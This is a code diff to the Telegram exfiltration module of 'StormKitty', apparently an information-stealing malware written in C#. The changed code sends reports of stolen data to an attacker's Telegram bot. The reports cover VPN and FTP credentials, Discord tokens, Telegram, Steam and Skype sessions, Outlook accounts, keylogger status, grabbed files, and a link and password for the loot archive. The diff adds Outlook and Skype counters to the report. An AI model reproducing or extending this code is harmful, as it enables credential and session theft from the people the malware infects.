@@ -53,9 +53,9 @@ namespace StormKitty.Telegram
         {
             try
             {
-                using (WebClient c = new WebClient())
+                using (WebClient client = new WebClient())
                 {
-                    string response = c.DownloadString(
+                    string response = client.DownloadString(
                         TelegramBotAPI + Config.TelegramAPI + "/getMe"
                     );
                     return response.StartsWith("{\"ok\":true,");
@@ -73,9 +73,9 @@ namespace StormKitty.Telegram
         {
             try
             {
-                using (WebClient c = new WebClient())
+                using (WebClient client = new WebClient())
                 {
-                    string response = c.DownloadString(
+                    string response = client.DownloadString(
                         TelegramBotAPI + Config.TelegramAPI + "/sendMessage" +
                         "?chat_id=" + Config.TelegramID +
                         "&text=" + text +
@@ -98,9 +98,9 @@ namespace StormKitty.Telegram
         {
             try
             {
-                using (WebClient c = new WebClient())
+                using (WebClient client = new WebClient())
                 {
-                    string response = c.DownloadString(
+                    string response = client.DownloadString(
                         TelegramBotAPI + Config.TelegramAPI + "/editMessageText" +
                         "?chat_id=" + Config.TelegramID +
                         "&text=" + text +
@@ -199,7 +199,9 @@ namespace StormKitty.Telegram
                 + Counter.GetIValue("📡 FTP hosts", Counter.FTPHosts)
                 + Counter.GetIValue("🔌 VPN accounts", Counter.VPN)
                 + Counter.GetIValue("🦢 Pidgin accounts", Counter.Pidgin)
+                + Counter.GetSValue("📫 Outlook accounts", Counter.Outlook)
                 + Counter.GetSValue("✈️ Telegram sessions", Counter.Telegram)
+                + Counter.GetSValue("☁️ Skype session", Counter.Skype)
                 + Counter.GetSValue("💬 Discord token", Counter.Discord)
                 + Counter.GetSValue("🎮 Steam session", Counter.Steam)
                 + Counter.GetSValue("🎮 Uplay session", Counter.Uplay)
@@ -219,12 +221,12 @@ namespace StormKitty.Telegram
                 "✅ Keylogger installed", "⛔️ Keylogger not installed")
                 + "\n"
                 + "\n  📄 *File Grabber:*"
-                + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
-                + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
-                + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
                 + Counter.GetIValue("📂 Images", Counter.GrabberImages)
+                + Counter.GetIValue("📂 Documents", Counter.GrabberDocuments)
+                + Counter.GetIValue("📂 Database files", Counter.GrabberDatabases)
+                + Counter.GetIValue("📂 Source code files", Counter.GrabberSourceCodes)
                 + "\n" 
-               + $"\n🔗 [Archive download link]({url})"
+                + $"\n🔗 [Archive download link]({url})"
                 + "\n🔐 *Archive password is*: \"_" + Implant.StringsCrypt.ArchivePassword + "\"_"
                 );
 
